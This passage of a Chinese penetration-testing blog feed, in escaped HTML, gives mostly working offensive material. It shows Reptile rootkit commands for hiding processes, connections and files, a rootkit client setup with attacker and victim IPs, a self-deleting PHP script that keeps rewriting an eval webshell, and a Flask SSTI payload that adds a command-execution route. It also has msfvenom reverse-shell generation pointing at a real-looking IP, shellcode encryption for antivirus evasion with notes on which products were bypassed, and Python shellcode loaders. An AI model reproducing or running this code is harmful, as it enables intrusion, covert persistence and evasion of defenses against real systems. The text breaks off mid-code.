class=&#34;language-bash&#34;&gt;配合msf上线，隐藏msf的进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;隐藏进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/reptile/reptile_cmd hide pid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/reptile/reptile_cmd show pid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;隐藏连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/reptile/reptile_cmd udp pid port hide&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/reptile/reptile_cmd tcp pid port show&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;隐藏文件 文件名中带reptile的都会被隐藏&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir reptile_xiaodi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;无须木马通过肉机软件直接控制肉机&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;客户端安装: ./setup.sh client&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置连接配置：要填写的信息为在肉机上安装 rookit时填写的目标主机 ip和端口，以及自己为其设置的密码和token值，至于 22 的端口，是伪造的，可以随意填写对方正在运行的端口。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LHOST 47.94.236.117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LPORT 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set SRCHOST 47.94.236.117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set SRCPORT 666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set RHOST 121.43.154.113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set RPORT 22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set PROT TCP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set PASS s3cr3t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set TOKEN hax0r&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;web内存马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web内存马&#34;&gt;#&lt;/a&gt; web 内存马&lt;/h3&gt;
&lt;p&gt;链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L01lbVNoZWxsRGVtbw==&#34;&gt;https://github.com/jweny/MemShellDemo&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Webshell 内存马，是在内存中写入恶意后门和木马并执行，达到远程控制 Web 服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的 Webshell 都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马， 区别在于 Webshell 内存马是无文件马，利用中间件的进程执行某些恶意代码， 不会有文件落地，给检测带来巨大难度。&lt;/p&gt;
&lt;p&gt;内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测， 通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 We bshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。&lt;/p&gt;
&lt;h4 id=&#34;php内存马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php内存马&#34;&gt;#&lt;/a&gt; php 内存马&lt;/h4&gt;
&lt;p&gt;set_time_limit () 函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep () 函数在执行程序时的持续时间将会被忽略掉）&lt;/p&gt;
&lt;p&gt;ignore_user_abort () 函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为 True，则忽略与用户的断开）&lt;/p&gt;
&lt;p&gt;unlink (FILE) 函数：删除文件（防止文件落地被检测工具查杀）&lt;/p&gt;
&lt;p&gt;file_put_contents 函数：将一个字符串写入该文件中&lt;/p&gt;
&lt;p&gt;usleep 函数：延迟执行当前脚本数微秒，即条件竞争&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ignore_user_abort(true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set_time_limit(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@unlink(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;file = &lt;span class=&#34;string&#34;&gt;&amp;#x27;.HH.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;code = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php @eval($_POST[\&amp;#x27;&lt;/span&gt;c\&lt;span class=&#34;string&#34;&gt;&amp;#x27;]); ?&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while (1)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;  file_put_contents($&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;file,&lt;span class=&#34;variable&#34;&gt;$code&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  usleep(5000);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;py内存马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py内存马&#34;&gt;#&lt;/a&gt; py 内存马&lt;/h4&gt;
&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA5MzM=&#34;&gt;https://xz.aliyun.com/t/10933&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;example1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://47.94.236.117:5000/test?param=&amp;#123;&amp;#123;url_for.__globals__[%27__builtins__% 27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lamb da%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27c md%27,%20%27whoami%27)).read())%22,&amp;#123;%27_request_ctx_stack%27:url_for.__g lobals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_ app%27]&amp;#125;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;example2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url_for.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;eval&amp;#x27;](&amp;quot;app.add_url_rule(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;/shell&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;shell&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lambda :__import__(&amp;#x27;os&amp;#x27;).popen(_request_ctx_stack.top.request.args.get(&amp;#x27;cmd&amp;#x27;, &amp;#x27;whoami&amp;#x27;)).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&amp;quot;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;app&amp;#x27;:url_for.__globals__[&amp;#x27;current_app&amp;#x27;] &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;java内存马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java内存马&#34;&gt;#&lt;/a&gt; java 内存马&lt;/h4&gt;
&lt;p&gt;链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE5MDU0OS5odG1s&#34;&gt;https://www.secpulse.com/archives/190549.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）按攻击思路，大致分为：&lt;br&gt;
Java Instrumentation 类（Agent 型）&lt;br&gt;
Servlet-api 类（Servlet 型、Filter 型、Listener 型）&lt;br&gt;
Spring 类（Controller 型、Interceptor 型）&lt;/p&gt;
&lt;p&gt;（ 2 ）按注入的对象分为：tomcat、weblogic、shiro 等类型。&lt;br&gt;
Servlet-api 类（Servlet 型、Filter 型、Listener 型）&lt;br&gt;
哥斯拉，冰蝎内存马功能使用&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/</id>
        <title>XD22 10 免杀对抗</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/"/>
        <content type="html">&lt;h3 id=&#34;源码层面免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#源码层面免杀&#34;&gt;#&lt;/a&gt; 源码层面免杀&lt;/h3&gt;
&lt;h4 id=&#34;c免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#c免杀&#34;&gt;#&lt;/a&gt; c 免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;木马生成&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;cs/msf 木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;cs-&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击-&amp;gt;生成后门-&amp;gt;payload生成windows可执行程序-&amp;gt;选择监听器-&amp;gt;生成&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;msf-&amp;gt; &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x lport=8079 -f c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;msf-&amp;gt; &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt; lhost=47.102.120.55 lport=8079 -f raw &amp;gt; shellcode.raw&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msf监听-&amp;gt; use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;木马免杀&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用 windows 将 c 文件编译为 exe 文件运行，c 文件可操作空间更大，而不像 exe 程序，直接是程序，修改之后可能失去了木马作用&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;xor加密:工具或自定义脚本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工具下载：https://github.com/Arno0x/ShellcodeWrapper&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用密钥“thisismykey ”对 shellcode 进行异或加密&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python2 shellcode_encoder.py -cpp -cs -py shellcode.raw thisismykey xor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;aes加密&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用密钥“thisismykey ”对 shellcode 进行aes加密&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成的cpp文件需要用gcc编译器进行编译成可执行文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;hex加密&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工具下载：https://github.com/ByPassAVTeam/ShellcodeLoader&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在线编码：https://gchq.github.io/CyberChef/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将 16 进制的payload生成exe可执行程序：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LoaderMaker.exe download.dat xiaodi.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;rc4 加密:https://blog.csdn.net/weixin_45590789/article/details/105536623&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;将shellcode经过rc4 加密，再进行利用&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;免杀结论&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;经测试，只有 rc4 加密绕过了 windows Defender，而 360 没有被这几种方法绕过，自己写的 xor 加密，aes 加密，hex 加密，rc4 加密都很大程度上绕过了火 绒。每次木马执行完毕后，需要清理，防止指纹被采集，下次就不是很好使用了。&lt;/p&gt;
&lt;h4 id=&#34;py免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py免杀&#34;&gt;#&lt;/a&gt; py 免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;py 执行木马的代码&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行代码 1&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = b&amp;quot;xxxxx&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.windll.kernel32.RtlMoveMemory(rwxpage,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.create_string_buffer(shellcode), len(shellcode))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.windll.kernel32.WaitForSingleObject(handle, -1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行代码 2&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(len(shellcode)),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(0x3000),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(0x40))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(len(shellcode)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ht = 